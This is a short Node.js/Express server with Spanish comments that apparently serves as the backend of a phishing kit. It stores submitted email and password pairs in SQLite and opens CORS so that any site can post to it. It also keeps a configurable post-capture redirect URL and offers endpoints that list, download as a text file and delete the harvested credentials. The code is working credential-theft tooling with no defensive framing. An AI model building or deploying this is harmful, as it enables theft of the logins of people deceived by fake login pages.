const express = require("express")
const sqlite3 = require("sqlite3").verbose()
const cors = require("cors") // <--- Añadir esta línea

const app = express()

app.use(cors()) // <--- Habilitar que cualquier web use tu script
app.use(express.json())
app.use(express.static("public"))

const db = new sqlite3.Database("database.db")

// Creamos las tablas: logins y una tabla de configuración para el link
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT, password TEXT, date DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    db.run(`CREATE TABLE IF NOT EXISTS config (
        id INTEGER PRIMARY KEY,
        redirect_url TEXT
    )`, () => {
        // Insertar link por defecto si no existe
        db.run("INSERT OR IGNORE INTO config (id, redirect_url) VALUES (1, 'https://google.com')");
    });
});

/* --- RUTAS DE CONFIGURACIÓN --- */

app.get("/config", (req, res) => {
    db.get("SELECT redirect_url FROM config WHERE id = 1", (err, row) => {
        res.json(row || { redirect_url: "https://google.com" });
    });
});

app.post("/config", (req, res) => {
    const { url } = req.body;
    db.run("UPDATE config SET redirect_url = ? WHERE id = 1", [url], function(err) {
        if (err) return res.status(500).json({ error: "error al guardar" });
        res.json({ success: true });
    });
});

/* --- OTRAS RUTAS (LOGINS Y DATA) --- */

app.post("/login", (req, res) => {
    const { email, password } = req.body;
    db.run("INSERT INTO logins (email, password) VALUES (?,?)", [email, password], (err) => {
        if (err) return res.status(500).json({ error: "db error" });
        res.json({ saved: true });
    });
});

app.get("/data", (req, res) => {
    db.all("SELECT * FROM logins ORDER BY id DESC", (err, rows) => {
        res.json(rows);
    });
});

app.get("/download/:limit", (req, res) => {
    const limit = Number(req.params.limit);
    db.all("SELECT * FROM logins ORDER BY id DESC LIMIT ?", [limit], (err, rows) => {
        let text = "";
        rows.forEach(row => text += `ID: ${row.id} | Email: ${row.email} | Pass: ${row.password}\n`);
        res.setHeader("Content-Disposition", "attachment; filename=datos.txt");
        res.send(text);
    });
});

app.delete("/delete/:id", (req, res) => {
    db.run("DELETE FROM logins WHERE id=?", [req.params.id], () => res.json({ deleted: true }));
});

app.listen(3000, () => console.log("Servidor en http://localhost:3000"));